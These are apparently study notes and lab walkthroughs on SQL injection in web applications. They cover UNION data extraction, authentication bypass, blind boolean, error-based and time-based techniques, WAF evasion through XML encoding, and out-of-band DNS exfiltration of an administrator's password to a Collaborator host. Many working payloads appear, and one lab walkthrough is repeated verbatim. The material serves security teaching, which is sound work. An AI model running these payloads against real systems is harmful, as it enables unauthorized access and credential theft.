## SQL injection in different parts of the query
Some other common locations where SQL injection arises are:

- In `UPDATE` statements, within the updated values or the `WHERE` clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER BY` clause.
The application doesn't implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:

`https://insecure-website.com/products?category=Gifts'--`
So  the `Gifts'--` is considering like the term who be served on database.

This results in the SQL query:
`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

Sql himsef add the first and the last `'` 
Crucially, note that `--` is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes `AND released = 1`. As a result, all products are displayed, including those that are not yet released.

You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

This results in the SQL query:

`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

The modified query returns all items where either the `category` is `Gifts`, or `1` is equal to `1`. As `1=1` is always true, the query returns all items.

If a user submits the username `wiener` and the password `bluecheese`, the application checks the credentials by performing the following SQL query:
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
They can do this using the SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query. For example, submitting the username `administrator'--` and a blank password results in the following query:

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.

The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query. For example:

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

### Method 1: ORDER BY Clause

1. **Injection Payload**: `' ORDER BY 1--`, `' ORDER BY 2--`, etc.
2. **Mechanism**: Modifies the original query to order by different columns.
3. **Error Detection**: When the column index exceeds the actual number of columns, the database returns an error.
4. **Response Indicators**: HTTP response may show the error, a generic error, or no results.

### Method 2: UNION SELECT with NULLs

1. **Injection Payload**: `' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--`, etc.
2. **Mechanism**: Submits UNION SELECT queries with varying numbers of NULL values.
3. **Error Detection**: When the number of NULLs doesn't match the actual number of columns, the database returns an error.
4. **Response Indicators**: HTTP response may show the error, a generic error, no results, or additional content (like an extra row with NULL values).

Both methods aim to identify the number of columns by provoking an error or detecting a change in the response. The choice between the two depends on the specifics of the application and database behavior.
##### Database-specific syntax
On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table.
There is a built-in table on Oracle called `dual` which can be used for this purpose.
`' UNION SELECT NULL FROM DUAL--`
The payloads described use the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment.

#### Finding columns with a useful data type

A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

`' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'--`

If the column data type is not compatible with string data, the injected query will cause a database error, such as:

`Conversion failed when converting the varchar value 'a' to data type int.`

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

###### Using a SQL injection UNION attack to retrieve interesting data
When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.

Suppose that:

- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the `WHERE` clause.
- The database contains a table called `users` with the columns `username` and `password`.

In this example, you can retrieve the contents of the `users` table by submitting the input:

`' UNION SELECT username, password FROM users--`

In order to perform this attack, you need to know that there is a table called `users` with two columns called `username` and `password`. Without this information, you would have to guess the names of the tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.

### Retrieving multiple values within a single column
In some cases the query in the previous example may only return a single column.

You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

`' UNION SELECT username || '~' || password FROM users--`

This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.

The results from the query contain all the usernames and passwords, for example:

`... administrator~s3cure wiener~peter carlos~montoya ...`

### Examining the database in SQL injection attacks

To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:

- The type and version of the database software.
- The tables and columns that the database contains.
### Querying the database type and version

You can potentially identify both the database type and version by injecting provider-specific queries to see if one works

The following are some queries to determine the database version for some popular database types:

|   |   |
|---|---|
|Database type|Query|
|Microsoft, MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

For example, you could use a `UNION` attack with the following input:

`' UNION SELECT @@version--`

This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:

`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`


## Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query `information_schema.tables` to list the tables in the database:

`SELECT * FROM information_schema.tables`

This returns output like the following:

`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE ``===================================================== MyDatabase dbo Products BASE TABLE MyDatabase dbo Users BASE TABLE MyDatabase dbo Feedback BASE TABLE`

This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.

You can then query `information_schema.columns` to list the columns in individual tables:

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

This returns output like the following:

`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE ================================================================= MyDatabase dbo Users UserId int MyDatabase dbo Users Username varchar MyDatabase dbo Users Password varchar`

This output shows the columns in the specified table and the data type of each column.



### Summary
**Summary: SQL Injection Techniques**

### Vulnerable Query Components
SQL injection can occur in different SQL statements, including:
- `UPDATE`: vulnerable in `SET` or `WHERE` clauses.
- `INSERT`: vulnerable in inserted values.
- `SELECT`: vulnerable in table/column names and `ORDER BY` clause.

### Basic SQL Injection Attack
A common attack form modifies the query by injecting SQL and commenting out the rest:
```plaintext
https://insecure-website.com/products?category=Gifts'--
```
This results in:
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
This example bypasses any conditions after `--`, making all items (including unreleased ones) visible.

An alternate injection to display all categories:
```plaintext
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

### Authentication Bypass
Submitting `'administrator'--` as a username and leaving the password blank can bypass authentication:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

### UNION-Based SQL Injection
The `UNION` keyword can retrieve data from other tables if:
1. The same number of columns are selected.
2. Data types match across columns.
   - Example: `' UNION SELECT NULL, NULL--`.

**Finding Column Count:** Inject `ORDER BY` or `UNION SELECT NULLs` to determine column compatibility.

**Determining Column Data Types:** Test each column by placing a string (`'a'`) in individual columns:
```sql
' UNION SELECT 'a',NULL,NULL,NULL-- 
```

### Retrieving Sensitive Data
Once columns are identified, use `UNION` to extract data:
```sql
' UNION SELECT username, password FROM users--
```

For single-column queries, use string concatenation:
```sql
' UNION SELECT username || '~' || password FROM users--
```

### Database Type and Version Identification
Determine database type/version with provider-specific queries:
- **Microsoft SQL Server, MySQL**: `SELECT @@version`
- **Oracle**: `SELECT * FROM v$version`
- **PostgreSQL**: `SELECT version()`

### Listing Database Structure
Querying `information_schema` views (excluding Oracle):
- List tables: `SELECT * FROM information_schema.tables`
- List columns in `Users` table:
  ```sql
  SELECT * FROM information_schema.columns WHERE table_name = 'Users'
  ```

## What is blind SQL injection?

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as `UNION` attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

### Exploiting blind SQL injection by triggering conditional responses
Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

When a request containing a `TrackingId` cookie is processed, the application uses a SQL query to determine whether this is a known user:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized `TrackingId`, the query returns data and you receive a "Welcome back" message in the response.

This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.
To understand how this exploit works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

`…xyz' AND '1'='1 
`…xyz' AND '1'='2`


- The first of these values causes the query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.

This allows us to determine the answer to any single injected condition, and extract data one piece at a time.
#### Exploiting blind SQL injection by triggering conditional responses - Continued

For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. You can determine the password for this user by sending a series of inputs to test the password one character at a time.

To do this, start with the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.

Next, we send the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is `s`:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`

We can continue this process to systematically determine the full password for the `Administrator` user.

### Error-based SQL injection

Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:

- You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in the same way as the conditional responses we looked at in the previous section. For more information, see Exploiting blind SQL injection by triggering conditional errors.
- You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones. For more information, see Extracting sensitive data via verbose SQL error messages.

### Exploiting blind SQL injection by triggering conditional errors

Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in the previous section won't work, because injecting different boolean conditions makes no difference to the application's responses.

It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.


### Exploiting blind SQL injection by triggering conditional errors - Continued

To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`

These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true:

- With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
- With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.

If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.

Using this technique, you can retrieve data by testing one character at a time:

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a` 

#### Note

There are different ways of triggering conditional errors, and different techniques work best on different database types. For more details, see the SQL injection cheat sheet.


## Extracting sensitive data via verbose SQL error messages

Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an `id` parameter:

`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`

This shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quoted string inside a `WHERE` statement. This makes it easier to construct a valid query containing a malicious payload. Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.

## Extracting sensitive data via verbose SQL error messages - Continued

Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one.

You can use the `CAST()` function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:

`CAST((SELECT example_column FROM example_table) AS int)`

Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an `int`, may cause an error similar to the following:

`ERROR: invalid input syntax for type integer: "Example data"`

This type of query may also be useful if a character limit prevents you from triggering conditional responses.


## Lab: Visible error-based SQL injection
1. Using Burp's built-in browser, explore the lab functionality.
2. Go to the **Proxy > HTTP history** tab and find a `GET /` request that contains a `TrackingId` cookie.
3. In Repeater, append a single quote to the value of your `TrackingId` cookie and send the request.
    
    `TrackingId=ogAZZfxtOKUELbuJ'`
4. In the response, notice the verbose error message. This discloses the full SQL query, including the value of your cookie. It also explains that you have an unclosed string literal. Observe that your injection appears inside a single-quoted string.
5. In the request, add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error:
    
    `TrackingId=ogAZZfxtOKUELbuJ'--`
6. Send the request. Confirm that you no longer receive an error. This suggests that the query is now syntactically valid.
7. Adapt the query to include a generic `SELECT` subquery and cast the returned value to an `int` data type:
    
    `TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--`
8. Send the request. Observe that you now get a different error saying that an `AND` condition must be a boolean expression.
9. Modify the condition accordingly. For example, you can simply add a comparison operator (`=`) as follows:
    
    `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`
10. Send the request. Confirm that you no longer receive an error. This suggests that this is a valid query again.
11. Adapt your generic `SELECT` statement so that it retrieves usernames from the database:
    
    `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--`
12. Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.
13. Delete the original value of the `TrackingId` cookie to free up some additional characters. Resend the request.
    
    `TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
14. Notice that you receive a new error message, which appears to be generated by the database. This suggests that the query was run properly, but you're still getting an error because it unexpectedly returned more than one row.
15. Modify the query to return only one row:
    
    `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
16. Send the request. Observe that the error message now leaks the first username from the `users` table:
    
    `ERROR: invalid input syntax for type integer: "administrator"`
17. Now that you know that the `administrator` is the first user in the table, modify the query once again to leak their password:
    
    `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
18. Log in as `administrator` using the stolen password to solve the lab.


#### Exploiting blind SQL injection by triggering time delays

If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.

The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:

`'; IF (1=2) WAITFOR DELAY '0:0:10'-- `

`'; IF (1=1) WAITFOR DELAY '0:0:10'--`


- The first of these inputs does not trigger a delay, because the condition `1=2` is false.
- The second input triggers a delay of 10 seconds, because the condition `1=1` is true.

Using this technique, we can retrieve data by testing one character at a time:

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

#### Note

There are various ways to trigger time delays within SQL queries, and different techniques apply on different types of database. For more details, see the SQL injection cheat sheet.

##### Lab: Blind SQL injection with time delays and information retrieval
1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
2. Modify the `TrackingId` cookie, changing it to:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
    
    Verify that the application takes 10 seconds to respond.
    
3. Now change it to:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
    
    Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.
    
4. Now change it to:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    Verify that the condition is true, confirming that there is a user called `administrator`.
    
5. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    This condition should be true, confirming that the password is greater than 1 character in length.
    
6. Send a series of follow-up values to test different password lengths. Send:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    Then send:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), you have determined the length of the password, which is in fact 20 characters long.
    
7. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
8. In Burp Intruder, change the value of the cookie to:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
    
9. Place payload position markers around the `a` character in the cookie value. To do this, select just the `a`, and click the **Add §** button. You should then see the following as the cookie value (note the payload position markers):
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
10. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lower case alphanumeric characters. In the **Payloads** side panel, check that **Simple list** is selected, and under **Payload configuration** add the payloads in the range a - z and 0 - 9. You can select these easily using the **Add from list** drop-down.
11. To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as possible, you need to configure the Intruder attack to issue requests in a single thread. To do this, click the **Resource pool** tab to open the **Resource pool** side panel and add the attack to a resource pool with the **Maximum concurrent requests** set to `1`.
12. Launch the attack by clicking the **Start attack** button.
13. Review the attack results to find the value of the character at the first position. You should see a column in the results called **Response received**. This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position.
14. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window and change the specified offset from 1 to 2. You should then see the following as the cookie value:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
15. Launch the modified attack, review the results, and note the character at the second offset.
16. Continue this process testing offset 3, 4, and so on, until you have the whole password.
17. In the browser, click **My account** to open the login page. Use the password to log in as the `administrator` user.

#### Lab: Blind SQL injection with time delays and information retrieval

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
2. Modify the `TrackingId` cookie, changing it to:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
    
    Verify that the application takes 10 seconds to respond.
    
3. Now change it to:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
    
    Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.
    
4. Now change it to:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    Verify that the condition is true, confirming that there is a user called `administrator`.
    
5. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    This condition should be true, confirming that the password is greater than 1 character in length.
    
6. Send a series of follow-up values to test different password lengths. Send:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    Then send:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), you have determined the length of the password, which is in fact 20 characters long.
    
7. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
8. In Burp Intruder, change the value of the cookie to:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
    
9. Place payload position markers around the `a` character in the cookie value. To do this, select just the `a`, and click the **Add §** button. You should then see the following as the cookie value (note the payload position markers):
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
10. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lower case alphanumeric characters. In the **Payloads** side panel, check that **Simple list** is selected, and under **Payload configuration** add the payloads in the range a - z and 0 - 9. You can select these easily using the **Add from list** drop-down.
11. To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as possible, you need to configure the Intruder attack to issue requests in a single thread. To do this, click the **Resource pool** tab to open the **Resource pool** side panel and add the attack to a resource pool with the **Maximum concurrent requests** set to `1`.
12. Launch the attack by clicking the **Start attack** button.
13. Review the attack results to find the value of the character at the first position. You should see a column in the results called **Response received**. This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position.
14. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window and change the specified offset from 1 to 2. You should then see the following as the cookie value:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
15. Launch the modified attack, review the results, and note the character at the second offset.
16. Continue this process testing offset 3, 4, and so on, until you have the whole password.
17. In the browser, click **My account** to open the login page. Use the password to log in as the `administrator` user.


### Exploiting blind SQL injection using out-of-band (OAST) techniques

An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.

A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems.

The easiest and most reliable tool for using out-of-band techniques is Burp Collaborator. This is a server that provides custom implementations of various network services, including DNS. It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Burp Suite Professional includes a built-in client that's configured to work with Burp Collaborator right out of the box. For more information, see the documentation for Burp Collaborator.

The techniques for triggering a DNS query are specific to the type of database being used. For example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:

`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`

This causes the database to perform a lookup for the following domain:

`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

You can use Burp Collaborator to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.

#### Lab: Blind SQL injection with out-of-band interaction

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
2. Modify the `TrackingId` cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--` 

3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie.

The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application. We'll go over this technique in the next lab.

### Exploiting blind SQL injection using out-of-band (OAST) techniques - Continued
Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:

`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`

This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:

`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`

Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.

#### Note

There are various ways of triggering out-of-band interactions, and different techniques apply on different types of database. For more details, see the SQL injection cheat sheet.

## SQL injection in different contexts

In the previous labs, you used the query string to inject your malicious SQL payload. However, you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.

These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the `S` character in `SELECT`:
```xml
<stockCheck> <productId>123</productId> <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId> </stockCheck>
```

This will be decoded server-side before being passed to the SQL interpreter.

## Lab: SQL injection with filter bypass via XML encoding

**Identify the vulnerability**

1. Observe that the stock check feature sends the `productId` and `storeId` to the application in XML format.
    
2. Send the `POST /product/stock` request to Burp Repeater.
    
3. In Burp Repeater, probe the `storeId` to see whether your input is evaluated. For example, try replacing the ID with mathematical expressions that evaluate to other potential IDs, for example:
    
    `<storeId>1+1</storeId>`
4. Observe that your input appears to be evaluated by the application, returning the stock for different stores.
    
5. Try determining the number of columns returned by the original query by appending a `UNION SELECT` statement to the original store ID:
    
    `<storeId>1 UNION SELECT NULL</storeId>`
6. Observe that your request has been blocked due to being flagged as a potential attack.
    

**Bypass the WAF**

1. As you're injecting into XML, try obfuscating your payload using XML entities. One way to do this is using the Hackvertor extension. Just highlight your input, right-click, then select **Extensions > Hackvertor > Encode > dec_entities/hex_entities**.
    
2. Resend the request and notice that you now receive a normal response from the application. This suggests that you have successfully bypassed the WAF.
    

**Craft an exploit**

1. Pick up where you left off, and deduce that the query returns a single column. When you try to return more than one column, the application returns `0 units`, implying an error.
    
2. As you can only return one column, you need to concatenate the returned usernames and passwords, for example:
    
    `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`
3. Send this query and observe that you've successfully fetched the usernames and passwords from the database, separated by a `~` character.
    
4. Use the administrator's credentials to log in and solve the lab.

## Second-order SQL injection

First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way.

